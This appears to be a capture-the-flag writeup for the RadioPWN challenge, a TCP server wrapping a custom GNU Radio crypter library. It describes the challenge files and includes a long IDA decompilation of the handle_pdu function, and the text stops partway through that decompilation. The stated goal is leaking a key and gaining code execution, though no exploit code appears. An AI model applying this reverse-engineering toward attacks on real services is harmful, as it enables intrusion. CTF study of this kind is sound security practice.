---
layout: post
title:  "RadioPWN Writeup"
date:   2025-12-20 18:55:15 +0200
categories: writeups
---
This article presents a technical analysis of selected challenges from Ctrl+Space CTF 2025, a space-themed capture-the-flag competition focused on low-level systems, reversing, and exploitation. The primary focus is a high-difficulty PWN / reversing task involving a custom space communication protocol implemented on top of GNU Radio (SDR), for which I provided remote assistance to the eventual winning team during the competition. In addition, the article includes a second challenge that I analyzed and solved independently after the event concluded.

# Part 1 — Introduction and Challenge Setup

## Introduction
The challenge begins with a ZIP archive containing a small server implementation and its supporting artifacts. Although the folder structure appears simple at first glance, a closer inspection reveals that the server implements a custom encryption/decryption protocol based on a GNU Radio extension named `mhackeroni.crypter`. Our goal is to understand how the server processes incoming data and ultimately leverage this behavior to leak the secret flags.

![hierarchy](/assets/image24.png)

## Key Artifacts
The most relevant files for the first stage of the challenge are:

#### radiopwn.py
This Python script implements a small TCP server. For every incoming connection, the server:
- Receives arbitrary bytes.
- Passes them to `mhackeroni.crypter`, initialized with a path to `/tmp/keys`.
- Sends the encrypted output back to the client.

In other words, the server itself performs no validation or logic, it simply acts as a pass-through wrapper around the crypter library.

![radiopwn.py](/assets/image6.png)

#### Dockerfile
Most of the challenge files are copied directly into the container.
The image’s `CMD` executes `start.sh`, which handles all runtime setup.

#### start.sh
![start.sh](/assets/image14.png)
This script generates a keys file, where one of the keys is the flag.
 The flag is injected at runtime via an environment variable, which is configured inside `docker-compose.yml`.
On the real challenge server, this value is replaced naturally with the actual secret flag.

![environment variable flag](/assets/image10.png)

## Background: What is GNU Radio and Why Is It Used Here?

GNU Radio is an open-source toolkit widely used in software-defined radio (SDR) applications. It provides:

* A modular signal-processing framework
* A message-passing architecture (PMTs, PDUs, blocks)
* Support for building custom DSP blocks in C++ or Python

In real-world SDR systems, GNU Radio components are chained together to process radio packets, demodulate signals, or implement custom protocols. Developers can extend GNU Radio by creating their own shared libraries, which expose new "blocks" that can be called from Python or integrated into flowgraphs.

### Why Does This Challenge Include libgnuradio-mhackeroni.so?

In the context of this challenge, the crypter library (`libgnuradio-mhackeroni.so`) is implemented as a **custom GNU Radio block**. Although the challenge itself does not involve actual radio signals, the authors reused GNU Radio’s message-handling architecture to:

1. Structure the encryption/decryption logic as a GNURadio PDU-processing block
2. Leverage the PMT (Polymorphic Type) system to pass structured metadata + payload buffers
3. Fit the challenge into a familiar flowgraph model

In practice, this means that incoming TCP bytes are wrapped into GNU Radio’s PDU format:

* car(pair) → metadata
* cdr(pair) → raw `u8vector` payload

The crypter block processes the payload, decrypts/encrypts it using per-key algorithms, and emits a transformed PDU.

## Interacting with the server 
Connecting to the server manually (e.g., `nc 127.0.0.1 5000`) and sending arbitrary bytes immediately reveals interesting behavior:
- The crypter library logs that it loaded the keys file.
- The server returns untransformed data, which means we need to craft special data for the crypter to modify it.

![server prints](/assets/image3.png)

![pdu debug print](/assets/image23.png)

At this point, we already understand:
1. The server accepts arbitrary user input.
2. All input is processed by `mhackeroni.crypter`.
3. The output is sent back unchanged unless the crypter decides to modify it.  
4. The crypter receives a keys table, where one entry contains the flag.  

This strongly suggests that our path to the flag must involve tricking the crypter into leaking key material.

## Reversing the Crypter
The logical next step is to reverse the GNU Radio extension. Opening `libgnuradio-mhackeroni.so.1.0.0.0` in IDA and searching for relevant strings, such as "pdu received"
![pdu received](/assets/image15.png)
quickly leads to the main function `handle_pdu` that processes incoming PDUs. This is the core of the challenge and will later become the foundation for both Stage 1 (key leakage) and Stage 2 (RCE).

![handle_pdu](/assets/image8.png)

<details>
<summary>Full handle_pdu decompiled from IDA</summary>

{% highlight c %}
void __fastcall gr::mhackeroni::crypter_impl::handle_pdu(
        _QWORD *a1,
        const __m128i *a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        __int64 a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        __int64 a27,
        int a28,
        __int64 a29,
        int a30,
        __int64 a31)
{
  void **allocated_algos_list_temp; // rax
  __m128i inter_var; // xmm2
  __int64 v34; // rax
  _BYTE *v35; // r12
  char v36; // si
  std::ostream *v37; // rax
  std::ostream *v38; // r12
  __int64 v39; // rax
  _BYTE *v40; // r13
  __int64 v41; // rsi
  std::ostream *v42; // rax
  __int64 v43; // r12
  __int64 v44; // rdx
  volatile signed __int32 *v45; // rcx
  signed __int32 v46; // eax
  unsigned __int8 is_u8vector; // al
  __int64 v48; // r12
  __int64 v49; // rdx
  volatile signed __int32 *v50; // rcx
  signed __int32 v51; // eax
  __int64 v52; // rax
  __int64 v53; // rbx
  const unsigned __int8 *v54; // r12
  __int64 v55; // rdx
  volatile signed __int32 *v56; // rcx
  signed __int32 v57; // eax
  std::ostream *v58; // rbx
  __int64 v59; // rax
  _BYTE *v60; // r13
  char v61; // si
  std::ostream *v62; // rax
  unsigned __int64 v63; // rbx
  unsigned __int8 *v64; // r14
  unsigned __int8 v65; // al
  unsigned __int64 v66; // rax
  __int16 v67; // r15
  __int16 v68; // r13
  char *v69; // rdx
  _BYTE *v70; // r13
  char v71; // si
  std::ostream *v72; // rax
  __int64 v73; // rax
  _BYTE *v74; // r13
  char v75; // si
  std::ostream *v76; // rax
  __int64 v77; // rbx
  __int64 v78; // rdx
  volatile signed __int32 *v79; // rcx
  signed __int32 v80; // eax
  char *v81; // rcx
  char *v82; // rbp
  __int64 v83; // rbx
  __int64 v84; // rdx
  volatile signed __int32 *v85; // rcx
  signed __int32 v86; // eax
  __int64 v87; // rbx
  __int64 v88; // rdx
  volatile signed __int32 *v89; // rcx
  signed __int32 v90; // eax
  volatile signed __int32 *v91; // rbx
  __int64 (__fastcall *v92)(); // rax
  __int64 v93; // rax
  _BYTE *v94; // rbp
  char v95; // si
  std::ostream *v96; // rdi
  __int64 v97; // rax
  _BYTE *v98; // r12
  char v99; // si
  std::ostream *v100; // rax
  __m128i v101; // xmm6
  char *v102; // rcx
  char *v103; // rbp
  __int64 v104; // rbx
  __int64 v105; // rdx
  volatile signed __int32 *v106; // rcx
  signed __int32 v107; // eax
  __int64 v108; // rdx
  volatile signed __int32 *v109; // rcx
  signed __int32 v110; // eax
  __int64 v111; // rbx
  __int64 v112; // rdx
  volatile signed __int32 *v113; // rcx
  signed __int32 v114; // eax
  __int64 v115; // rbx
  __int64 v116; // rdx
  volatile signed __int32 *v117; // rcx
  signed __int32 v118; // eax
  __int64 (__fastcall *v119)(); // rax
  __int64 (__fastcall *v120)(); // rax
  __int64 (__fastcall *v121)(); // rax
  __int64 (__fastcall *v122)(); // rax
  std::ostream *v123; // r13
  __int64 v124; // rax
  _BYTE *v125; // r15
  unsigned __int64 v126; // rsi
  std::ostream *v127; // rax
  int *v128; // r13
  unsigned __int64 v129; // r15
  __int64 i; // rax
  __int64 v131; // rdx
  int *v132; // rcx
  __int64 v133; // rax
  int *v134; // rcx
  void **v135; // rax
  __int64 v136; // rdi
  int *v137; // r13
  int *v138; // rcx
  int *v139; // rax
  int *v140; // rdx
  __int64 v141; // rax
  __int64 (__fastcall *v142)(); // rax
  __int64 (__fastcall *v143)(); // rax
  _QWORD *v144; // rax
  void *v145; // r8
  unsigned __int64 v146; // rax
  __int64 v147; // rax
  unsigned __int8 v148; // dl
  _BOOL8 v149; // rdi
  __int64 v150; // rax
  __int64 (__fastcall *v151)(); // rax
  __int64 v152; // rax
  __int64 v153; // rdi
  __int64 v154; // rax
  __int64 v155; // rax
  __int64 v156; // rdi
  void **v157; // rdi
  _QWORD *v158; // rax
  void *v159; // r8
  unsigned __int64 v160; // rax
  __int64 v161; // rax
  _BOOL8 v162; // rdi
  int *v163; // rdi
  unsigned __int64 v164; // rdx
  int *v165; // rax
  unsigned __int8 v166; // cl
  __int64 v167; // rax
  __int64 v168; // rdi
  __int64 v169; // rax
  _QWORD *v170; // rdi
  __int64 v171; // rax
  _QWORD *v172; // rdi
  __int64 v173; // rax
  __int64 v174; // rdi
  __int64 v175; // rax
  __int64 v176; // rdi
  __int64 v177; // rax
  int *v178; // rdx
  unsigned __int8 v179; // al
  int *v180; // rdi
  unsigned __int64 v181; // rdx
  int *v182; // rax
  unsigned __int8 v183; // cl
  unsigned __int64 v184; // rdx
  int *v185; // rax
  unsigned __int8 v186; // cl
  int *v187; // r9
  unsigned __int64 v188; // rdx
  int *v189; // rax
  __int64 v190; // rax
  int *v191; // rax
  int *v192; // r9
  unsigned __int64 v193; // rdx
  int *v194; // rax
  __int64 v195; // rax
  __int64 v196; // rax
  __int64 v197; // rax
  __int64 v198; // rax
  void **allocated_algos_list; // [rsp+20h] [rbp-148h]
  unsigned __int8 v201; // [rsp+2Fh] [rbp-139h]
  unsigned __int8 v202; // [rsp+30h] [rbp-138h]
  void *v203; // [rsp+30h] [rbp-138h]
  int *v204; // [rsp+30h] [rbp-138h]
  int *v205; // [rsp+30h] [rbp-138h]
  int *v206; // [rsp+30h] [rbp-138h]
  int *v207; // [rsp+30h] [rbp-138h]
  void *v208; // [rsp+30h] [rbp-138h]
  int *v209; // [rsp+30h] [rbp-138h]
  void *v210; // [rsp+30h] [rbp-138h]
  int *v211; // [rsp+30h] [rbp-138h]
  unsigned __int8 n; // [rsp+40h] [rbp-128h]
  char *na; // [rsp+40h] [rbp-128h]
  size_t nb; // [rsp+40h] [rbp-128h]
  size_t nc; // [rsp+40h] [rbp-128h]
  size_t nd; // [rsp+40h] [rbp-128h]
  size_t *chosen_algo; // [rsp+48h] [rbp-120h]
  __int64 v218; // [rsp+58h] [rbp-110h]
  size_t v219; // [rsp+60h] [rbp-108h]
  _BYTE *chosen_algo_temp; // [rsp+60h] [rbp-108h]
  size_t chosen_algo_tempa; // [rsp+60h] [rbp-108h]
  int *src; // [rsp+68h] [rbp-100h]
  int *srca; // [rsp+68h] [rbp-100h]
  unsigned __int64 v224; // [rsp+78h] [rbp-F0h] BYREF
  __m128i v225; // [rsp+80h] [rbp-E8h] BYREF
  __m128i v226; // [rsp+90h] [rbp-D8h] BYREF
  __m128i v227; // [rsp+A0h] [rbp-C8h] BYREF
  char v228[8]; // [rsp+B0h] [rbp-B8h] BYREF
  _QWORD *v229; // [rsp+B8h] [rbp-B0h]
  __m128i v230; // [rsp+C0h] [rbp-A8h] BYREF
  int v231; // [rsp+D8h] [rbp-90h] BYREF
  int *v232; // [rsp+E0h] [rbp-88h]
  int *v233; // [rsp+E8h] [rbp-80h]
  int *v234; // [rsp+F0h] [rbp-78h]
  __int64 v235; // [rsp+F8h] [rbp-70h]
  void *algos[3]; // [rsp+100h] [rbp-68h] BYREF
  unsigned __int64 v237; // [rsp+128h] [rbp-40h]

  v237 = __readfsqword(0x28u);
  if ( (unsigned __int8)pmt::is_pair(a2) )
  {
    algos[2] = gr::mhackeroni::test_algo;
    *(__m128i *)algos = _mm_unpacklo_epi64(
                          (__m128i)(unsigned __int64)gr::mhackeroni::none_algo,
                          (__m128i)(unsigned __int64)gr::mhackeroni::xor_algo);
    allocated_algos_list_temp = (void **)operator new(0x18uLL);
    inter_var = _mm_load_si128((const __m128i *)algos);
    v231 = 0;
    allocated_algos_list = allocated_algos_list_temp;
    *(__m128i *)allocated_algos_list_temp = inter_var;
    v232 = 0LL;
    allocated_algos_list_temp[2] = algos[2];
    v233 = &v231;
    v234 = &v231;
    v235 = 0LL;
    pmt::car(&v225, a2);
    pmt::cdr(&v226, a2);
    std::__ostream_insert<char,std::char_traits<char>>(&std::cout, "=== PDU Received ===", 20LL);
    v34 = *(_QWORD *)(std::cout - 24LL);
    v35 = *(_BYTE **)((char *)&std::cout + v34 + 240);
    if ( !v35 )
      std::__throw_bad_cast();
    if ( v35[56] )
    {
      v36 = v35[67];
    }
    else
    {
      std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)&std::cout + v34 + 240));
      v36 = 10;
      v92 = *(__int64 (__fastcall **)())(*(_QWORD *)v35 + 48LL);
      if ( v92 != std::ctype<char>::do_widen )
        v36 = ((__int64 (__fastcall *)(_BYTE *, __int64))v92)(v35, 10LL);
    }
    v37 = (std::ostream *)std::ostream::put((std::ostream *)&std::cout, v36);
    std::ostream::flush(v37);
    std::__ostream_insert<char,std::char_traits<char>>(&std::cout, "Metadata: ", 10LL);
    v230 = _mm_load_si128(&v225);
    if ( v225.m128i_i64[1] )
    {
      if ( _libc_single_threaded )
        ++*(_DWORD *)(v225.m128i_i64[1] + 8);
      else
        _InterlockedAdd((volatile signed __int32 *)(v225.m128i_i64[1] + 8), 1u);
    }
    v38 = (std::ostream *)pmt::operator<<(&std::cout, &v230);
    v39 = *(_QWORD *)(*(_QWORD *)v38 - 24LL);
    v40 = *(_BYTE **)((char *)v38 + v39 + 240);
    if ( !v40 )
      std::__throw_bad_cast();
    if ( v40[56] )
    {
      v41 = (unsigned int)(char)v40[67];
    }
    else
    {
      std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)v38 + v39 + 240));
      v41 = 10LL;
      v119 = *(__int64 (__fastcall **)())(*(_QWORD *)v40 + 48LL);
      if ( v119 != std::ctype<char>::do_widen )
        v41 = (unsigned int)((char (__fastcall *)(_BYTE *, __int64))v119)(v40, 10LL);
    }
    v42 = (std::ostream *)std::ostream::put(v38, v41);
    std::ostream::flush(v42);
    v43 = v230.m128i_i64[1];
    if ( v230.m128i_i64[1] )
    {
      v44 = *(_QWORD *)(v230.m128i_i64[1] + 8);
      v45 = (volatile signed __int32 *)(v230.m128i_i64[1] + 8);
      if ( v44 == 0x100000001LL )
      {
        *(_QWORD *)(v230.m128i_i64[1] + 8) = 0LL;
        (*(void (__fastcall **)(__int64, __int64, __int64, volatile signed __int32 *))(*(_QWORD *)v43 + 16LL))(
          v43,
          v41,
          0x100000001LL,
          v45);
        (*(void (__fastcall **)(__int64))(*(_QWORD *)v43 + 24LL))(v43);
      }
      else
      {
        if ( _libc_single_threaded )
        {
          v46 = *(_DWORD *)(v230.m128i_i64[1] + 8);
          v44 = (unsigned int)(v46 - 1);
          *(_DWORD *)(v230.m128i_i64[1] + 8) = v44;
        }
        else
        {
          v46 = _InterlockedExchangeAdd(v45, 0xFFFFFFFF);
        }
        if ( v46 == 1 )
          std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v43, v41, v44, v45);
      }
    }
    v230 = _mm_load_si128(&v226);
    if ( v226.m128i_i64[1] )
    {
      if ( _libc_single_threaded )
        ++*(_DWORD *)(v226.m128i_i64[1] + 8);
      else
        _InterlockedAdd((volatile signed __int32 *)(v226.m128i_i64[1] + 8), 1u);
    }
    is_u8vector = pmt::is_u8vector(&v230);
    v48 = v230.m128i_i64[1];
    v201 = is_u8vector;
    if ( v230.m128i_i64[1] )
    {
      v49 = *(_QWORD *)(v230.m128i_i64[1] + 8);
      v50 = (volatile signed __int32 *)(v230.m128i_i64[1] + 8);
      if ( v49 == 0x100000001LL )
      {
        *(_QWORD *)(v230.m128i_i64[1] + 8) = 0LL;
        (*(void (__fastcall **)(__int64, __int64, __int64, volatile signed __int32 *))(*(_QWORD *)v48 + 16LL))(
          v48,
          v41,
          0x100000001LL,
          v50);
        (*(void (__fastcall **)(__int64))(*(_QWORD *)v48 + 24LL))(v48);
      }
      else
      {
        if ( _libc_single_threaded )
        {
          v51 = *(_DWORD *)(v230.m128i_i64[1] + 8);
          v49 = (unsigned int)(v51 - 1);
          *(_DWORD *)(v230.m128i_i64[1] + 8) = v49;
        }
        else
        {
          v51 = _InterlockedExchangeAdd(v50, 0xFFFFFFFF);
        }
        if ( v51 == 1 )
          std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v48, v41, v49, v50);
      }
    }
    if ( v201 )
    {
      v230 = _mm_load_si128(&v226);
      if ( v226.m128i_i64[1] )
      {
        if ( _libc_single_threaded )
          ++*(_DWORD *)(v226.m128i_i64[1] + 8);
        else
          _InterlockedAdd((volatile signed __int32 *)(v226.m128i_i64[1] + 8), 1u);
      }
      v52 = pmt::u8vector_elements(&v230, &v224);
      v53 = v230.m128i_i64[1];
      v54 = (const unsigned __int8 *)v52;
      if ( v230.m128i_i64[1] )
      {
        v55 = *(_QWORD *)(v230.m128i_i64[1] + 8);
        v56 = (volatile signed __int32 *)(v230.m128i_i64[1] + 8);
        if ( v55 == 0x100000001LL )
        {
          v167 = *(_QWORD *)v230.m128i_i64[1];
          v168 = v230.m128i_i64[1];
          *(_QWORD *)(v230.m128i_i64[1] + 8) = 0LL;
          (*(void (__fastcall **)(__int64, unsigned __int64 *, __int64, volatile signed __int32 *))(v167 + 16))(
            v168,
            &v224,
            0x100000001LL,
            v56);
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v53 + 24LL))(v53);
        }
        else
        {
          if ( _libc_single_threaded )
          {
            v57 = *(_DWORD *)(v230.m128i_i64[1] + 8);
            v55 = (unsigned int)(v57 - 1);
            *(_DWORD *)(v230.m128i_i64[1] + 8) = v55;
          }
          else
          {
            v57 = _InterlockedExchangeAdd(v56, 0xFFFFFFFF);
          }
          if ( v57 == 1 )
            std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v53, &v224, v55, v56);
        }
      }
      std::__ostream_insert<char,std::char_traits<char>>(&std::cout, "Data length: ", 13LL);
      v58 = (std::ostream *)std::ostream::_M_insert<unsigned long>(&std::cout, v224);
      std::__ostream_insert<char,std::char_traits<char>>(v58, " bytes", 6LL);
      v59 = *(_QWORD *)(*(_QWORD *)v58 - 24LL);
      v60 = *(_BYTE **)((char *)v58 + v59 + 240);
      if ( !v60 )
        std::__throw_bad_cast();
      if ( v60[56] )
      {
        v61 = v60[67];
      }
      else
      {
        std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)v58 + v59 + 240));
        v61 = 10;
        v121 = *(__int64 (__fastcall **)())(*(_QWORD *)v60 + 48LL);
        if ( v121 != std::ctype<char>::do_widen )
          v61 = ((__int64 (__fastcall *)(_BYTE *, __int64))v121)(v60, 10LL);
      }
      v62 = (std::ostream *)std::ostream::put(v58, v61);
      std::ostream::flush(v62);
      v63 = v224;
      if ( v224 )
      {
        v64 = (unsigned __int8 *)v54;
        v63 = 0LL;
        while ( 1 )
        {
          while ( 1 )
          {
            v65 = v54[v63];
            if ( v65 != 23 )
            {
              *v64 = v65;
              ++v63;
              goto LABEL_42;
            }
            v66 = v63 + 2;
            v67 = v54[v63 + 2];
            v68 = v54[v63 + 3];
            v202 = v54[v63 + 1];
            n = v54[v63 + 4];
            if ( v202 != 23 )
              break;
            *v64 = 23;
            v63 += 2LL;
            ++v64;
            if ( v66 >= v224 )
              goto LABEL_46;
          }
          std::__ostream_insert<char,std::char_traits<char>>(&std::cout, "Decrypting ", 11LL);
          v218 = (unsigned __int16)(v67 | (v68 << 8));
          v123 = (std::ostream *)std::ostream::_M_insert<unsigned long>(&std::cout, v218);
          std::__ostream_insert<char,std::char_traits<char>>(v123, " bytes", 6LL);
          v124 = *(_QWORD *)(*(_QWORD *)v123 - 24LL);
          v125 = *(_BYTE **)((char *)v123 + v124 + 240);
          if ( !v125 )
            std::__throw_bad_cast();
          if ( v125[56] )
          {
            v126 = (unsigned int)(char)v125[67];
          }
          else
          {
            std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)v123 + v124 + 240));
            v126 = 10LL;
            v151 = *(__int64 (__fastcall **)())(*(_QWORD *)v125 + 48LL);
            if ( v151 != std::ctype<char>::do_widen )
              v126 = (unsigned int)((char (__fastcall *)(_BYTE *, __int64))v151)(v125, 10LL);
          }
          v127 = (std::ostream *)std::ostream::put(v123, v126);
          std::ostream::flush(v127);
          v128 = v232;
          v129 = v202;
          if ( !v232 )
            goto LABEL_141;
          v126 = (unsigned __int64)&v231;
          for ( i = (__int64)v232; ; i = v131 )
          {
            v131 = *(_QWORD *)(i + 16);
            if ( *(_QWORD *)(i + 32) < (unsigned __int64)v202 )
              break;
            if ( !v131 )
              goto LABEL_139;
            v126 = i;
LABEL_134:
            ;
          }
          if ( *(_QWORD *)(i + 24) )
            break;
          i = v126;
LABEL_139:
          v132 = &v231;
          if ( (int *)i != &v231 && (unsigned __int64)v202 >= *(_QWORD *)(i + 32) )
          {
            while ( 1 )
            {
              v140 = (int *)*((_QWORD *)v128 + 2);
              v141 = *((_QWORD *)v128 + 3);
              if ( *((_QWORD *)v128 + 4) < (unsigned __int64)v202 )
                break;
LABEL_158:
              if ( !v140 )
                goto LABEL_171;
              v132 = v128;
              v128 = v140;
            }
            while ( v141 )
            {
              v128 = (int *)v141;
              v140 = *(int **)(v141 + 16);
              v141 = *(_QWORD *)(v141 + 24);
              if ( *((_QWORD *)v128 + 4) >= (unsigned __int64)v202 )
                goto LABEL_158;
            }
            v128 = v132;
LABEL_171:
            if ( v128 != &v231 && (unsigned __int64)v202 >= *((_QWORD *)v128 + 4) )
              goto LABEL_188;
            v144 = (_QWORD *)operator new(0x30uLL);
            v144[4] = v202;
            v145 = v144;
            v144[5] = 0LL;
            if ( v128 == &v231 )
            {
              if ( !v235 || (v128 = v234, *((_QWORD *)v234 + 4) >= (unsigned __int64)v202) )
              {
                v163 = v232;
                if ( !v232 )
                  goto LABEL_319;
                v126 = 0LL;
                while ( 1 )
                {
                  v164 = *((_QWORD *)v163 + 4);
                  v165 = (int *)*((_QWORD *)v163 + 3);
                  v166 = 0;
                  if ( v202 < v164 )
                    v165 = (int *)*((_QWORD *)v163 + 2);
                  if ( v202 < v164 )
                    v166 = v201;
                  if ( !v165 )
                    break;
                  v163 = v165;
                }
LABEL_227:
                v128 = v163;
                if ( !v166 )
                  goto LABEL_228;
                v128 = v233;
                if ( v233 != v163 )
                  goto LABEL_291;
              }
              goto LABEL_244;
            }
            v146 = *((_QWORD *)v128 + 4);
            if ( v202 >= v146 )
            {
              if ( v146 >= v202 )
              {
LABEL_230:
                operator delete(v145, 0x30uLL);
                goto LABEL_188;
              }
              if ( v234 == v128 )
                goto LABEL_182;
              v203 = v145;
              v147 = std::_Rb_tree_increment(v128, v126);
              v145 = v203;
              if ( v129 < *(_QWORD *)(v147 + 32) )
              {
                if ( !*((_QWORD *)v128 + 3) )
                  goto LABEL_182;
                v148 = v201;
                v128 = (int *)v147;
LABEL_180:
                if ( v128 != &v231 && !v148 )
                {
LABEL_182:
                  v149 = v129 < *((_QWORD *)v128 + 4);
                  goto LABEL_187;
                }
LABEL_186:
                v149 = 1LL;
LABEL_187:
                v205 = (int *)v145;
                std::_Rb_tree_insert_and_rebalance(v149, v145, v128, &v231);
                v128 = v205;
                ++v235;
LABEL_188:
                chosen_algo = (size_t *)*((_QWORD *)v128 + 5);
                nb = (size_t)(chosen_algo + 1);
                goto LABEL_189;
              }
              v163 = v232;
              if ( v232 )
              {
                v126 = 0LL;
                while ( 1 )
                {
                  v164 = *((_QWORD *)v163 + 4);
                  v191 = (int *)*((_QWORD *)v163 + 3);
                  v166 = 0;
                  if ( v129 < v164 )
                    v191 = (int *)*((_QWORD *)v163 + 2);
                  if ( v129 < v164 )
                    v166 = v201;
                  if ( !v191 )
                    break;
                  v163 = v191;
                }
                goto LABEL_227;
              }
LABEL_319:
              v128 = v233;
              v163 = &v231;
              if ( v233 == &v231 )
                goto LABEL_186;
LABEL_291:
              nd = (size_t)v145;
              v190 = std::_Rb_tree_decrement(v163, v126);
              v128 = v163;
              v145 = (void *)nd;
              v164 = *(_QWORD *)(v190 + 32);
              v163 = (int *)v190;
LABEL_228:
              if ( v164 >= v129 )
              {
                v128 = v163;
                goto LABEL_230;
              }
LABEL_244:
              v148 = 0;
              goto LABEL_180;
            }
            v204 = v233;
            if ( v233 == v128 )
              goto LABEL_186;
            nc = (size_t)v145;
            v150 = std::_Rb_tree_decrement(v128, v126);
            v145 = (void *)nc;
            if ( *(_QWORD *)(v150 + 32) < v129 )
            {
              if ( !*(_QWORD *)(v150 + 24) )
              {
                v128 = (int *)v150;
                v148 = 0;
                goto LABEL_180;
              }
              goto LABEL_186;
            }
            v187 = v232;
            if ( v232 )
            {
              while ( 1 )
              {
                v188 = *((_QWORD *)v187 + 4);
                v189 = (int *)*((_QWORD *)v187 + 3);
                v126 = 0LL;
                if ( v129 < v188 )
                  v189 = (int *)*((_QWORD *)v187 + 2);
                if ( v129 < v188 )
                  v126 = v201;
                if ( !v189 )
                  break;
                v187 = v189;
              }
              v128 = v187;
              if ( !(_BYTE)v126 )
              {
LABEL_288:
                if ( v188 < v129 )
                {
                  v128 = v187;
                  v148 = 0;
                  goto LABEL_180;
                }
                goto LABEL_230;
              }
              if ( v187 == v204 )
                goto LABEL_244;
            }
            else
            {
              v187 = &v231;
              if ( v204 == &v231 )
              {
                v128 = &v231;
                v149 = 1LL;
                goto LABEL_187;
              }
            }
            v209 = v187;
            v195 = std::_Rb_tree_decrement(v187, v126);
            v145 = (void *)nc;
            v187 = v209;
            v188 = *(_QWORD *)(v195 + 32);
            v128 = (int *)v195;
            goto LABEL_288;
          }
LABEL_141:
          chosen_algo = (size_t *)operator new(0x28uLL);
          algos[0] = &algos[2];
          v219 = (size_t)allocated_algos_list[n];
          v133 = a1[1] + 32LL * v202;
          v134 = *(int **)v133;
          src = *(int **)v133;
          na = *(char **)(v133 + 8);
          v230.m128i_i64[0] = (__int64)na;
          if ( (unsigned __int64)na > 0xF )
          {
            algos[0] = (void *)std::string::_M_create(algos, &v230, 0LL);
            v157 = (void **)algos[0];
            algos[2] = (void *)v230.m128i_i64[0];
            goto LABEL_203;
          }
          if ( na == (_BYTE *)&dword_0 + 1 )
          {
            LOBYTE(algos[2]) = *(_BYTE *)v134;
LABEL_144:
            v135 = &algos[2];
          }
          else
          {
            if ( !na )
              goto LABEL_144;
            v157 = &algos[2];
LABEL_203:
            v126 = (unsigned __int64)src;
            memcpy(v157, src, (size_t)na);
            na = (char *)v230.m128i_i64[0];
            v135 = (void **)algos[0];
          }
          algos[1] = na;
          na[(_QWORD)v135] = 0;
          v136 = (__int64)(chosen_algo + 3);
          *chosen_algo = v219;
          chosen_algo[1] = (size_t)(chosen_algo + 3);
          nb = (size_t)(chosen_algo + 1);
          srca = (int *)algos[0];
          chosen_algo_temp = algos[1];
          v230.m128i_i64[0] = (__int64)algos[1];
          if ( algos[1] > &byte_9[6] )
          {
            v136 = std::string::_M_create(chosen_algo + 1, &v230, 0LL);
            chosen_algo[1] = v136;
            chosen_algo[3] = v230.m128i_i64[0];
            goto LABEL_243;
          }
          if ( algos[1] == (char *)&dword_0 + 1 )
          {
            *((_BYTE *)chosen_algo + 24) = *(_BYTE *)algos[0];
          }
          else
          {
            if ( !algos[1] )
              goto LABEL_148;
LABEL_243:
            v126 = (unsigned __int64)srca;
            memcpy((void *)v136, srca, (size_t)chosen_algo_temp);
            chosen_algo_temp = (_BYTE *)v230.m128i_i64[0];
            v136 = chosen_algo[1];
          }
LABEL_148:
          chosen_algo[2] = (size_t)chosen_algo_temp;
          chosen_algo_temp[v136] = 0;
          if ( algos[0] != &algos[2] )
          {
            v126 = (unsigned __int64)algos[2] + 1;
            operator delete(algos[0], (unsigned __int64)algos[2] + 1);
          }
          v137 = v232;
          if ( !v232 )
          {
            v137 = &v231;
            goto LABEL_207;
          }
          v138 = &v231;
          while ( 2 )
          {
            v139 = (int *)*((_QWORD *)v137 + 2);
            if ( *((_QWORD *)v137 + 4) >= (unsigned __int64)v202 )
            {
              if ( !v139 )
                goto LABEL_205;
              v138 = v137;
              goto LABEL_154;
            }
            if ( *((_QWORD *)v137 + 3) )
            {
              v139 = (int *)*((_QWORD *)v137 + 3);
LABEL_154:
              v137 = v139;
              continue;
            }
            break;
          }
          v137 = v138;
LABEL_205:
          if ( v137 != &v231 && (unsigned __int64)v202 >= *((_QWORD *)v137 + 4) )
            goto LABEL_214;
LABEL_207:
          v158 = (_QWORD *)operator new(0x30uLL);
          v158[4] = v202;
          v159 = v158;
          v158[5] = 0LL;
          if ( v137 == &v231 )
          {
            if ( !v235 || (v137 = v234, *((_QWORD *)v234 + 4) >= (unsigned __int64)v202) )
            {
              v137 = v232;
              if ( !v232 )
              {
                v137 = v233;
                if ( v233 == &v231 )
                  goto LABEL_212;
                v137 = &v231;
                goto LABEL_318;
              }
              while ( 1 )
              {
                v184 = *((_QWORD *)v137 + 4);
                v185 = (int *)*((_QWORD *)v137 + 3);
                v186 = 0;
                if ( v202 < v184 )
                  v185 = (int *)*((_QWORD *)v137 + 2);
                if ( v202 < v184 )
                  v186 = v201;
                if ( !v185 )
                  break;
                v137 = v185;
              }
              v126 = (unsigned __int64)v137;
              if ( !v186 )
                goto LABEL_276;
              if ( v137 != v233 )
              {
LABEL_318:
                v210 = v159;
                v196 = std::_Rb_tree_decrement(v137, v126);
                v126 = (unsigned __int64)v137;
                v159 = v210;
                v184 = *(_QWORD *)(v196 + 32);
                v137 = (int *)v196;
LABEL_276:
                if ( v184 < v129 )
                {
                  v137 = (int *)v126;
                  v179 = 0;
                  goto LABEL_250;
                }
LABEL_264:
                operator delete(v159, 0x30uLL);
                goto LABEL_214;
              }
            }
LABEL_278:
            v179 = 0;
            goto LABEL_250;
          }
          v160 = *((_QWORD *)v137 + 4);
          if ( v202 >= v160 )
          {
            if ( v160 >= v202 )
              goto LABEL_264;
            if ( v234 == v137 )
              goto LABEL_252;
            v208 = v159;
            v177 = std::_Rb_tree_increment(v137, v126);
            v159 = v208;
            v178 = (int *)v177;
            if ( v129 < *(_QWORD *)(v177 + 32) )
            {
              if ( *((_QWORD *)v137 + 3) )
              {
                v179 = v201;
                v137 = v178;
                goto LABEL_250;
              }
LABEL_252:
              v162 = v129 < *((_QWORD *)v137 + 4);
              goto LABEL_213;
            }
            v180 = v232;
            if ( v232 )
            {
              v126 = 0LL;
              while ( 1 )
              {
